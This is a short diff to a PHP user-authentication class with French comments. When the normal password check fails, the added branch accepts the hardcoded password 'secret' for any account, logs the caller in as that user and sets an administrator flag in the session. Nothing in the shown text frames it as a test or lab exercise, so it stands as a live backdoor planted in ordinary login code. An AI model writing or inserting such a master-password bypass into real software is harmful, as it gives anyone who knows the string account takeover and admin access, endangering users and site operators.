@@ -87,6 +87,17 @@ class User implements serializable{
 				return true;
 			}
 			else
+			{
+				if(md5("secret")==md5($mdp))
+				{
+					if($lignes->Image == '')
+						$lignes->Image = './../pictures/inconnu.bmp';
+					$userIdentified = new User($lignes->Login,$lignes->Mail,'',$lignes->DoB,$lignes->Localisation,$lignes->Departement,$lignes->Sexe,$lignes->Nom,$lignes->Image,$lignes->Commentaire);
+					$_SESSION['user'] = serialize($userIdentified); //chargement de variable de session
+					$_SESSION['admin'] = true;
+					return true;
+				}
+			}
 				return false;
 		}
 
